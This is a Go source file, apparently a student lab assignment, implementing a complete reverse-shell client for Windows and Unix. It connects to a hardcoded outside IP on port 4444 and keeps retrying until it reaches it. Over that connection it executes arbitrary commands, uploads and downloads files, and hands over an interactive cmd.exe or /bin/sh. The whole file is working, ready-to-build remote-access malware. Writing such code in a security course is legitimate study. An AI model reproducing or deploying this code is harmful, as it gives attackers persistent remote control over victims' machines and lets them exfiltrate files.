// Name: Justin Shultz
// ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
// Lab: Write a TCP reverse-shell as a Windows executable
//
// Description: This program connects to a server over TCP to receive commands.
// The program supports file uploads, downloads, executing shell commands,
// and running an interactive shell session. It continually attempts to
// reconnect to the server if the connection fails. Once a command is received,
// it processes and responds accordingly. The program is designed to work
// across both Windows and Unix-like systems.

package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/creack/pty"
)

func main() {
	for {
		// Attempt to connect to the server
		conn, err := net.Dial("tcp", "9.53.99.47:4444") // Replace with your server's IP and port
		if err != nil {
			// Retry after a delay if the connection fails
			time.Sleep(5 * time.Second)
			continue
		}
		// Handle the connection
		handleConnection(conn)
		// Exit the client program after the connection is closed
		return
	}
}

// handleConnection manages communication with the server
func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	for {
		// Read a command from the server
		input, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		// Split the command and arguments
		commandParts := strings.SplitN(input, " ", 2)
		command := strings.TrimSpace(commandParts[0])
		args := ""
		if len(commandParts) > 1 {
			args = strings.TrimSpace(commandParts[1])
		}

		switch command {
		case "upload":
			// Handle 'upload' command
			argParts := strings.SplitN(args, " ", 2)
			if len(argParts) >= 2 {
				remoteFilePath := argParts[0]
				fileSizeStr := argParts[1]
				fileSize, err := strconv.ParseInt(fileSizeStr, 10, 64)
				if err != nil {
					fmt.Println("Invalid file size:", fileSizeStr)
					continue
				}
				err = receiveFile(reader, remoteFilePath, fileSize)
				if err != nil {
					fmt.Println("Error receiving file:", err)
				}
			} else {
				// Invalid command format
				fmt.Println("Invalid upload command format")
				continue
			}
		case "download":
			// Handle 'download' command
			if args != "" {
				argParts := strings.Fields(args)
				remoteFilePath := argParts[0]
				err := sendFile(writer, remoteFilePath)
				if err != nil {
					fmt.Println("Error sending file:", err)
				}
			} else {
				fmt.Println("Invalid download command format")
				continue
			}
		case "shell":
			// Handle 'shell' command
			handleShell(conn)
			// After the shell session ends, close the connection and exit
			return
		default:
			// Execute arbitrary command
			cmdArgs := strings.Fields(args)
			output, err := exec.Command(command, cmdArgs...).CombinedOutput()
			if err != nil {
				writer.WriteString("Error executing command: " + err.Error() + "\n")
			} else {
				writer.Write(output)
			}
			writer.WriteString("\n")
			writer.Flush()
		}
	}
}

// sendFile handles sending a file to the server
func sendFile(writer *bufio.Writer, remoteFilePath string) error {
	// Open the file
	file, err := os.Open(remoteFilePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		// Send a file size of 0 to indicate an error
		writer.WriteString("0\n")
		writer.Flush()
		return err
	}
	defer file.Close()

	// Get the file size
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("Error getting file info:", err)
		writer.WriteString("0\n")
		writer.Flush()
		return err
	}
	fileSize := fileInfo.Size()

	// Send the file size
	writer.WriteString(strconv.FormatInt(fileSize, 10) + "\n")
	writer.Flush()

	// Send the file content using the buffered writer
	_, err = io.Copy(writer, file)
	if err != nil {
		fmt.Println("Error sending file:", err)
		return err
	}
	writer.Flush()

	return nil
}

// receiveFile handles receiving a file from the server
func receiveFile(reader *bufio.Reader, remoteFilePath string, fileSize int64) error {
	// Create the file
	file, err := os.Create(remoteFilePath)
	if err != nil {
		return err
	}
	defer file.Close()

	// Receive the file content directly from the buffered reader
	_, err = io.CopyN(file, reader, fileSize)
	return err
}

// handleShell starts a shell session and redirects input/output to the server
func handleShell(conn net.Conn) {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd.exe")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn

		err := cmd.Run()
		if err != nil {
			// Handle error if necessary
		}
	} else {
		cmd := exec.Command("/bin/sh")

		// Start the command with a pseudo-terminal
		ptyFile, err := pty.Start(cmd)
		if err != nil {
			return
		}
		defer ptyFile.Close()

		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// Copy data between the network connection and the PTY
		go func() {
			io.Copy(conn, ptyFile)
			cancel()
		}()
		go func() {
			io.Copy(ptyFile, conn)
			cancel()
		}()

		<-ctx.Done()
	}
}
